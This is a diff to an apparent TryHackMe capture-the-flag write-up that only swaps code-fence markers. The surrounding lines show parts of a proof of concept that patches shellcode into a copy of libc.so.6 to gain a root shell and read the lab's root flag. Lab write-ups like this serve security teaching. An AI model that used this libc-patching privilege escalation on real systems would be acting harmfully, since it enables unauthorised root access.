@@ -155,7 +155,7 @@ BUFFER_SIZE should be defined as the maximum size of tunestr.
 
 
 #PoC
-'''
+```
 nopriv@looneytunes:~$ cat gen_libc.py 
 #!/usr/bin/env python3
 
@@ -174,8 +174,8 @@ idx = d.find(orig)
 d[idx : idx + len(sc)] = sc
 
 open("./libc.so.6", "wb").write(d)
-'''
-'''
+```
+```
 nopriv@looneytunes:~$ python3 gen_libc.py 
 [*] '/lib/x86_64-linux-gnu/libc.so.6'
     Arch:     amd64-64-little
@@ -209,4 +209,4 @@ root
 # cat root.txt
 THM{TH-TH-THATS-SECURE-FOLKS!}
 # exit
-'''
+```
